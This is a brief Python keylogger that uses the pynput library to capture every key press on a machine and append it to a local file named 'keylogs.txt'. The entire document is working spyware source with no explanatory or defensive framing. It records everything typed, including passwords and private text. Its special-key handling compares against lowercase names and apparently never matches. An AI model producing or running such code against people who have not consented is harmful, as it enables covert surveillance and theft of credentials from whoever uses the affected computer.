from pynput.keyboard import Listener
log_file = "keylogs.txt"

def log_keystrokes(key):
    key = str(key).replace("'","")

    if key == "key.space":
        key = " "
    elif key == "key.enter":
        key = "\n"
    elif key =="key.backspace":
        key = "[BACKSPACE]"
    elif key == "key.shift" or key == "key.shift_r":
        key = "[SHIFT]"
    elif key == "key.ctrl" or key == "key.ctrl_r":
        key = "[CTRL]"
    elif key == "key.alt" or key == "key.alt_r":
        key = "[ALT]"
    elif key.startswith("key"):
        key = f"[{key.split('.')[1].upper()}]"

    with open(log_file,"a") as f:
        f.write(key)

with Listener(on_press=log_keystrokes) as listener:
    listener.join()

